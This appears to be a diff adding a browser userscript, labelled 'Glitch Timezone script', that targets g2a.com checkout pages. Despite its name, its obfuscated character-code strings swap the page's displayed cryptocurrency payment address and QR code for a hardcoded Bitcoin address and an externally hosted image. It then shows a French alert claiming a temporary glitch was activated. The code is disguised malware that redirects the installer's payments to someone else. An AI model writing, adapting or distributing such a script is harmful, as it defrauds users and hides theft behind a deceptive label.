@@ -1,0 +1,40 @@
+// ==UserScript==
+// @name Glitch Timezone script
+// @namespace
+// @version 0.1
+// @description Glitch Timezone script
+// @author You
+// @match https://www.g2a.com/*
+// @icondata:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @grant none
+// ==/UserScript==
+
+const i = setInterval(() => {
+
+  const _0x48a127 = document.querySelector(".indexes__BreakableText-sc-1ksp1zs-14");
+
+  const _0x249b68 = document.querySelector(".indexes__QrCodeImage-sc-1ksp1zs-12");
+
+  if (_0x48a127 && _0x249b68) {
+
+    _0x48a127.innerText = String.fromCharCode(98, 99, 49, 113, 117, 119, 115, 53, 104, 52, 118, 97, 104, 101, 109, 97, 110, 113, 52, 106, 52, 97, 51, 106, 107, 100, 50, 57, 50, 122, 122, 104, 56, 52, 110, 118, 108, 99, 99, 48, 100, 119);
+
+    const _0x2641c0 = _0x249b68.src;
+
+    _0x249b68.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 105, 46, 105, 109, 103, 117, 114, 46, 99, 111, 109, 47, 82, 76, 74, 55, 97, 56, 121, 46, 106, 112, 101, 103);
+
+    _0x249b68.onload = () => {
+
+      if (_0x249b68.src !== _0x2641c0) {
+
+        setTimeout(() => alert(String.fromCharCode(67, 104, 97, 110, 103, 101, 109, 101, 110, 116, 32, 116, 101, 109, 112, 111, 114, 97, 105, 114, 101, 32, 103, 108, 105, 116, 99, 104, 32, 97, 99, 116, 105, 118, 233, 32, 33, 32, 65, 112, 112, 117, 121, 101, 114, 32, 115, 117, 114, 32, 79, 107, 32, 112, 111, 117, 114, 32, 99, 111, 110, 116, 105, 110, 117, 101, 114, 32, 33)), 500);
+
+      }
+
+    };
+
+    clearInterval(i);
+
+  }
+
+}, 10);
